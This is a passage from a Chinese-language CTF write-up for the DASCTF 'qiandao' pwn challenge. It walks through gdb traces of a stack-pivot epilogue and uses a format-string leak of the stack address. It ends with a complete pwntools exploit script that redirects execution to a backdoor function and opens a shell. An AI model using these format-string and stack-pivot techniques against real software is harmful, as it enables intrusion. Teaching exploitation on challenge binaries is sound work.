class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0xffffd064</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd0f4</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd2c2</span> <span class="token punctuation">(</span><span class="token string">"/home/hunter/PWN/DASCTF/qiandao"</span><span class="token punctuation">)</span><span class="token number">0028</span><span class="token operator">|</span> <span class="token number">0xffffd068</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd0fc</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd2e2</span> <span class="token punctuation">(</span><span class="token string">"XDG_VTNR=7"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x08048601</span> in <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><ul><li>0x80485fd &lt;main+104&gt;:    mov    ecx,DWORD PTR [ebp-0x4] 将ebp-0x4处的数据值赋给了ecx</li><li>0x8048601 &lt;main+108&gt;:    lea    esp,[ecx-0x4]    将exc-0x4赋给esp</li><li>ret                                           pop ip 转跳<br>因为这里不是常规的leave ret结尾，常规栈溢出肯定无法实现。</li></ul><p><strong>通过上面三条关键语句的梳理可知：ebp-0x4里面的数据 赋给ecx。然后esp指向ecx-0x4处的地址，最后ret到那个地址。</strong><br><strong>所以控制ebp-0x4处的非常关键，决定了程序流程。</strong></p><h3 id="小错误"><a href="#小错误" class="headerlink" title="小错误"></a>小错误</h3><p>当时我也注意到了这个问题，然后就构造payload把ebp-0x4处的地址覆盖为：p32（backdoor）+0x4.这样0x8048601 &lt;main+108&gt;:    lea    esp,[ecx-0x4] 语句后 esp指向p32（backdoor）了，然后ret一下就成功了。</p><pre class=" language-java"><code class="language-java">ECX<span class="token operator">:</span> <span class="token function">0x8048581</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    in     al<span class="token punctuation">,</span>dx<span class="token punctuation">)</span>EDX<span class="token operator">:</span> <span class="token number">0xf7fa189c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> ESI<span class="token operator">:</span> <span class="token number">0xf7fa0000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> EDI<span class="token operator">:</span> <span class="token number">0x0</span> EBP<span class="token operator">:</span> <span class="token number">0x0</span> ESP<span class="token operator">:</span> <span class="token function">0x804857d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">></span><span class="token operator">:</span>    push   ebp<span class="token punctuation">)</span>EIP<span class="token operator">:</span> <span class="token function">0x8048604</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span><span class="token operator">:</span>    ret<span class="token punctuation">)</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x282</span> <span class="token punctuation">(</span>carry parity adjust zero SIGN trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x80485fd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    mov    ecx<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span>   <span class="token number">0x8048600</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span><span class="token operator">:</span>    leave     <span class="token number">0x8048601</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token operator">:</span>    lea    esp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x8048604</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x8048605</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048607</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048609</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x804860b</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token function">0x804857d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">></span><span class="token operator">:</span>    push   ebp<span class="token punctuation">)</span><span class="token number">0004</span><span class="token operator">|</span> <span class="token function">0x8048581</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    in     al<span class="token punctuation">,</span>dx<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token function">0x8048585</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token operator">:</span>    or     al<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token number">0012</span><span class="token operator">|</span> <span class="token function">0x8048589</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token operator">:</span>    add    al<span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token function">0x804858d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token punctuation">(</span>bad<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">0020</span><span class="token operator">|</span> <span class="token function">0x8048591</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token operator">:</span>    les    edx<span class="token punctuation">,</span>FWORD PTR <span class="token punctuation">[</span>eax<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token function">0x8048595</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span><span class="token operator">:</span>    lea    ecx<span class="token punctuation">,</span><span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">0028</span><span class="token operator">|</span> <span class="token function">0x8048599</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    and    esp<span class="token punctuation">,</span><span class="token number">0xfffffff0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x08048604</span> in <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>看，esp确实指向了backdoor。说明我都想法还是挺不错的，但是事实很残酷，在执行lea    esp,[ecx-0x4]后esp就指向了backdoor（0x804857d )，相当于将backdoor以下都是为栈中数据，由于NX保护无法执行。可以看到那些指令都被拆分了，没有成型的system语句。</p><p><strong>因此我们要做的就是在ret时仅仅把backdoor首地址 pop到ip中 而不是让esp直接指向backdoor</strong></p><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><p>将backdoor地址放入某个栈中，调节ecx，使得esp可以左后指向这个栈地址，然后ret 将该栈中地址pop入ip。这样esp将会指向下一个栈帧，同时ip存入了backdoor地址</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>利用fmt漏洞泄露栈地址</li><li>根据相对位移调节ebp-0x4地址里，应该放入的值</li></ul><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>泄露栈地址最好先用gdb搞清楚栈分布，在printf处下断点</p><pre class=" language-java"><code class="language-java">EBP<span class="token operator">:</span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> ESP<span class="token operator">:</span> <span class="token number">0xffffd010</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span>EIP<span class="token operator">:</span> <span class="token function">0x80485d1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x80483e0</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token punctuation">)</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x296</span> <span class="token punctuation">(</span>carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x80485ca</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">53</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span>   <span class="token number">0x80485cd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">56</span><span class="token operator">></span><span class="token operator">:</span>    lea    eax<span class="token punctuation">,</span><span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">]</span>   <span class="token number">0x80485d0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">59</span><span class="token operator">></span><span class="token operator">:</span>    push   eax<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x80485d1</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x80483e0</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span>   <span class="token number">0x80485d6</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">65</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span>   <span class="token number">0x80485d9</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">68</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span>   <span class="token number">0x80485dc</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x80486ac</span>   <span class="token number">0x80485e1</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">76</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x8048400</span> <span class="token operator">&lt;</span>puts<span class="token annotation punctuation">@plt</span><span class="token operator">></span>Guessed arguments<span class="token operator">:</span>arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0xffffd010</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0004</span><span class="token operator">|</span> <span class="token number">0xffffd014</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0xffffd018</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0012</span><span class="token operator">|</span> <span class="token number">0xffffd01c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x80485ab</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0xffffd020</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb23fc</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb3200</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0020</span><span class="token operator">|</span> <span class="token number">0xffffd024</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0xffffd028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0028</span><span class="token operator">|</span> <span class="token number">0xffffd02c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x804865b</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span><span class="token operator">:</span>    add    edi<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> valueBreakpoint <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x080485d1</span> in <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ niAAAA<span class="token punctuation">.</span><span class="token number">0xf7fb2000</span><span class="token punctuation">.</span><span class="token number">0xffffd048</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0x41414141</span></code></pre><p>我的输入为AAAA.%1$p.%2$p.%5$p.%8$p，执行printf函数后结果为：<strong>AAAA.0xf7fb2000.0xffffd048.(nil).0x41414141</strong><br>此时栈情况：</p><pre class=" language-java"><code class="language-java"><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0xffffd010</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span>   <span class="token number">0004</span><span class="token operator">|</span> <span class="token number">0xffffd014</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span>        off<span class="token operator">=</span><span class="token number">1</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0xffffd018</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span>             off<span class="token operator">=</span><span class="token number">2</span><span class="token number">0012</span><span class="token operator">|</span> <span class="token number">0xffffd01c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x80485ab</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0xffffd020</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb23fc</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb3200</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0020</span><span class="token operator">|</span> <span class="token number">0xffffd024</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0xffffd028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0028</span><span class="token operator">|</span> <span class="token number">0xffffd02c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x804865b</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span><span class="token operator">:</span>    add    edi<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span>      off<span class="token operator">=</span><span class="token number">8</span><span class="token number">0036</span><span class="token operator">|</span> <span class="token function">0xffffd034</span> <span class="token punctuation">(</span><span class="token string">".%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token function">0xffffd038</span> <span class="token punctuation">(</span><span class="token string">"p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0044</span><span class="token operator">|</span> <span class="token function">0xffffd03c</span> <span class="token punctuation">(</span><span class="token string">"$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token function">0xffffd040</span> <span class="token punctuation">(</span><span class="token string">"5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0052</span><span class="token operator">|</span> <span class="token function">0xffffd044</span> <span class="token punctuation">(</span><span class="token string">"%8$p"</span><span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0060</span><span class="token operator">|</span> <span class="token number">0xffffd04c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token number">0064</span><span class="token operator">|</span> <span class="token number">0xffffd050</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0068</span><span class="token operator">|</span> <span class="token number">0xffffd054</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0072</span><span class="token operator">|</span> <span class="token number">0xffffd058</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0076</span><span class="token operator">|</span> <span class="token number">0xffffd05c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span></code></pre><p>二者结合可以明显看出fmt漏洞规律。所以以后需要泄露栈地址，用fmt加gdb调试，泄露函数就用常规的偏移量。显然此处8是偏移量<br>我们在偏移为2的地方可以泄露ebp地址。</p><p><strong>所以我们用第一个gets函数来泄露地址，那么用第二个gets函数来控制流程</strong></p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>得到ebp地址，可以求出gets(&amp;v4)中v4的地址（char v4; // [esp+0h] [ebp-28h])，然后我们直接在v4首地址放入p32（backdoor）在ebp-0x4地址处放入&amp;v4+0x4</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p32（backdoor）payload <span class="token operator">+=</span> ’A'<span class="token operator">*</span><span class="token number">0x20</span>payload <span class="token operator">+=</span> p32（ebp<span class="token number">-0x28</span><span class="token operator">+</span><span class="token number">0x4</span>）</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'qiandao'</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'backdoor'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./qiandao'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%2$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAA'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"ebp_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ebp_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ebp_addr<span class="token number">-0x28</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java">ebp_addr<span class="token operator">==</span><span class="token operator">></span><span class="token number">0xffef9ae8</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x29</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">7d</span> <span class="token number">85</span> <span class="token number">04</span> <span class="token number">08</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │<span class="token punctuation">}</span>···│AAAA│AAAA│AAAA│    <span class="token number">00000010</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token number">00000020</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  c4 9a ef ff  0a                        │AAAA│····│·│    <span class="token number">00000029</span><span class="token punctuation">[</span><span class="token 